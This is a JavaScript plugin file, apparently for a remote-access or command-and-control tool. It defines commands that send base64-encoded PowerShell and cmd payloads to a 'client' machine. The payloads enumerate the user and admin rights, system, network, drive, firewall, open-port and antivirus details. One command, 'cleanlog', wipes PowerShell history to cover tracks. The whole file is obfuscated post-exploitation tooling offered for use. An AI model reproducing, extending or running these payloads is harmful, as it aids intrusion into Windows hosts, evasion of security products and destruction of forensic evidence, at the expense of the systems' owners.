// Register a plugin
module.exports = {
    name: 'System Profiling',
    type: 'client',
    description: 'A client plugin to profile the system.',
    commands: {
        whoami: {
            name: 'whoami',
            method: 'payload-ps',
            description: `Returns the current logged in user information of the client.`,
            handler: (props) => {
                return `QHtVc2VybmFtZT0kZW52OlVTRVJOQU1FOyBIb21lRGlyPSRlbnY6VVNFUlBST0ZJTEU7IEZ1bGxOYW1lPShHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbSkuVXNlck5hbWU7IFNJRD0oTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWwoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKSkuSWRlbnRpdHkuVXNlci5WYWx1ZTsgRG9tYWluPSRlbnY6VVNFUkRPTUFJTjsgSXNBZG1pbj0oW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpfSB8IEZvcm1hdC1UYWJsZSAtQXV0b1NpemU=`;
            }
        },
        sysinfo: {
            name: 'sysinfo',
            method: 'payload-ps',
            description: `Returns a list of system details of the client.`,
            handler: (props) => {
                return `R2V0LUNvbXB1dGVySW5mbw==`;
            }
        },
        dnsinfo: {
            name: 'dnsinfo',
            method: 'payload-ps',
            description: `Returns the dns info of all inferfaces on the client.`,
            handler: (props) => {
                return `R2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3M=`;
            }
        },
        routeinfo: {
            name: 'routeinfo',
            method: 'payload-ps',
            description: `Returns the network routes open on the client.`,
            handler: (props) => {
                return `R2V0LU5ldFJvdXRlIHwgU2VsZWN0LU9iamVjdCBEZXN0aW5hdGlvblByZWZpeCwgTmV4dEhvcCwgUm91dGVNZXRyaWMsIEludGVyZmFjZUFsaWFzLCBBZGRyZXNzRmFtaWx5LCBTdGF0ZSB8IENvbnZlcnRUby1Kc29u`;
            }
        },
        checkps: {
            name: 'checkps',
            method: 'payload-ps',
            description: `Returns powershell version and can determine if powershell is enabled on the client.`,
            handler: (props) => {
                return `R2V0LUNoaWxkSXRlbSAtUGF0aCBIS0xNOlxcU29mdHdhcmVcXE1pY3Jvc29mdFxcUG93ZXJTaGVsbA==`;
            }
        },
        network: {
            name: 'network',
            method: 'payload-ps',
            description: `Returns system network information of the client.`,
            handler: (props) => {
                return `R2V0LU5ldEFkYXB0ZXIgfCBGb3JFYWNoLU9iamVjdCB7ICRhZGFwdGVyID0gJF87IChHZXQtTmV0SVBBZGRyZXNzIC1JbnRlcmZhY2VJbmRleCAkYWRhcHRlci5pZkluZGV4IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSB8IEZvckVhY2gtT2JqZWN0IHsgW1BTQ3VzdG9tT2JqZWN0XUB7IEludGVyZmFjZT0kYWRhcHRlci5OYW1lOyBJUEFkZHJlc3M9JF8uSVBBZGRyZXNzOyBBZGRyZXNzRmFtaWx5PSRfLkFkZHJlc3NGYW1pbHk7IFByZWZpeExlbmd0aD0kXy5QcmVmaXhMZW5ndGg7IE1hY0FkZHJlc3M9JGFkYXB0ZXIuTWFjQWRkcmVzczsgTGlua1NwZWVkPSRhZGFwdGVyLkxpbmtTcGVlZDsgU3RhdHVzPSRhZGFwdGVyLlN0YXR1cyB9fX0gfCBDb252ZXJ0VG8tSnNvbg==`;
            }
        },
        drives: {
            name: 'drives',
            method: 'payload-ps',
            description: `Get the list of drives mounted on the client.`,
            handler: (props) => {
                return `R2V0LVBTRHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSB8IFNlbGVjdC1PYmplY3QgTmFtZSwgQHtOYW1lPSdQYXRoJzsgRXhwcmVzc2lvbj17JF8uUm9vdH19`;
            }
        },
        antivirus: {
            name: 'antivirus',
            method: 'payload-ps',
            description: `Returns the current antivirus product installed.`,
            handler: (props) => {
                return `R2V0LUNpbUluc3RhbmNlIC1OYW1lc3BhY2UgInJvb3QvU2VjdXJpdHlDZW50ZXIyIiAtQ2xhc3NOYW1lIEFudGlWaXJ1c1Byb2R1Y3Q=`;
            }
        },
        cleanlog: {
            name: 'cleanlog',
            method: 'payload-ps',
            description: 'Cleans the powershell history and logs.',
            handler: () => {
                return `Q2xlYXItSGlzdG9yeSB8IFtNaWNyb3NvZnQuUG93ZXJTaGVsbC5QU0NvbnNvbGVSZWFkTGluZV06OkNsZWFySGlzdG9yeSgp`;
            }
        },
        fwrules: {
            name: 'fwrules',
            method: 'payload-cmd',
            description: 'Return all firewall rules including their status and configurations.',
            handler: () => {
                return `bmV0c2ggYWR2ZmlyZXdhbGwgZmlyZXdhbGwgc2hvdyBydWxlIG5hbWU9YWxs`;
            }
        },
        fwprofile: {
            name: 'fwprofile',
            method: 'payload-cmd',
            description: 'Return the status of all firewall profiles (Domain, Private, Public).',
            handler: () => {
                return `bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcw==`
            }
        },
        ports: {
            name: 'ports',
            method: 'payload-ps',
            description: 'Returns all open ports on the client.',
            handler: () => {
                return `R2V0LU5ldFRDUENvbm5lY3Rpb258U2VsZWN0LU9iamVjdCBMb2NhbEFkZHJlc3MsTG9jYWxQb3J0LFN0YXRl`;
            }
        }
    }
};